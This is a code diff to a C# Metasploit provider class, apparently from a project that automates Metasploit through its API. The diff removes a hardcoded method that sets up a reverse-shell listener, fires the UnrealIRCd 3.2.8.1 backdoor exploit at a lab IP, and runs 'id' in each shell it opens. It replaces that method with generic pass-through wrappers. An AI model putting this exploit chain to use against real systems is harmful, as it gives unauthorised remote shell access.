@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Net;
 using Lacey.Alexa.Common.Metasploit.Manager;
 using Microsoft.Extensions.Logging;
 
@@ -7,11 +8,13 @@ namespace Lacey.Alexa.Common.Metasploit.Providers.Concrete
 {
     public sealed class MetasploitProvider : IMetasploitProvider, IDisposable
     {
+        #region Fields/Constructor
+
         private readonly ILogger _logger;
 
         private readonly MetasploitSession _session;
 
-        private readonly MetasploitManager _metasploit;
+        private readonly MetasploitProManager _metasploit;
 
         public MetasploitProvider(
             string metasploitUrl, 
@@ -23,73 +26,65 @@ namespace Lacey.Alexa.Common.Metasploit.Providers.Concrete
             var creds = authProvider.GetUserSecrets();
             _session = new MetasploitSession(creds.Username, creds.Password, $"{metasploitUrl}/api/");
             _metasploit = new MetasploitProManager(_session);
+            MetasploitAddress = IPAddress.Parse(new Uri(metasploitUrl).Host);
         }
 
-        public Dictionary<string, object> Unreal_Ircd_3281_Backdoor()
+        #endregion
+
+        #region IMetasploitProvider
+
+        public IPAddress MetasploitAddress { get; private set; }
+
+        public Dictionary<string, object> ExecuteModule(string moduleType, string moduleName, Dictionary<string, object> options)
         {
-            Dictionary<string, object> response = null;
-
-            var blah = new Dictionary<string, object>
-            {
-                ["ExitOnSession"] = "false",
-                ["PAYLOAD"] = "cmd/unix/reverse",
-                ["LHOST"] = "192.168.0.12",
-                ["LPORT"] = "4444"
-            };
-
-            response = _metasploit.ExecuteModule("exploit", "multi/handler", blah);
-
-            var jobId = response["job_id"];
-            var opts = new Dictionary<string, object>
-            {
-                ["RHOST"] = "192.168.0.13",
-                ["DisablePayloadHandler"] = "true",
-                ["LHOST"] = "192.168.0.12",
-                ["LPORT"] = "4444",
-                ["PAYLOAD"] = "cmd/unix/reverse"
-            };
-
-            response = _metasploit.ExecuteModule("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
-
-            response = _metasploit.ListJobs();
-            var vals = new List<object>(response.Values);
-            while (vals.Contains((object)"Exploit: unix/irc/unreal_ircd_3281_backdoor"))
-            {
-                Console.WriteLine("Waiting");
-                System.Threading.Thread.Sleep(6000);
-                response = _metasploit.ListJobs();
-                vals = new List<object>(response.Values);
-            }
-
-
-            response = _metasploit.StopJob(jobId.ToString());
-            response = _metasploit.ListSessions();
-            
-            Console.WriteLine("I popped " + response.Count + " shells. Awesome.");
-
-			foreach (var pair in response) {
-				var id = pair.Key;
-				var dict = (Dictionary<string, object>)pair.Value;
-				if (dict["type"] as string == "shell") {
-					response = _metasploit.WriteToSessionShell(id, "id\n");
-					System.Threading.Thread.Sleep(6000);
-					response = _metasploit.ReadSessionShell(id);
-                    Console.WriteLine(response["data"]);
-			
-					_metasploit.StopSession(id);
-				}
-			}
-
-            var bl = _metasploit.GetModuleCompatibleSessions("multi/general/execute");
-            Console.WriteLine("fdsa");
-
-            return response;
+            return _metasploit.ExecuteModule(moduleType, moduleName, options);
         }
+
+        public Dictionary<string, object> ListJobs()
+        {
+            return _metasploit.ListJobs();
+        }
+
+        public Dictionary<string, object> StopJob(string jobId)
+        {
+            return _metasploit.StopJob(jobId);
+        }
+
+        public Dictionary<string, object> ListSessions()
+        {
+            return _metasploit.ListSessions();
+        }
+
+        public Dictionary<string, object> WriteToSessionShell(string sessionId, string data)
+        {
+            return _metasploit.WriteToSessionShell(sessionId, data);
+        }
+
+        public Dictionary<string, object> ReadSessionShell(string sessionId)
+        {
+            return _metasploit.ReadSessionShell(sessionId);
+        }
+
+        public Dictionary<string, object> StopSession(string sessionId)
+        {
+            return _metasploit.StopSession(sessionId);
+        }
+
+        public Dictionary<string, object> GetModuleCompatibleSessions(string moduleName)
+        {
+            return _metasploit.GetModuleCompatibleSessions(moduleName);
+        }
+
+        #endregion
+
+        #region IDisposable
 
         public void Dispose()
         {
             _metasploit.Dispose();
             _session.Dispose();
         }
+
+        #endregion
     }
 }
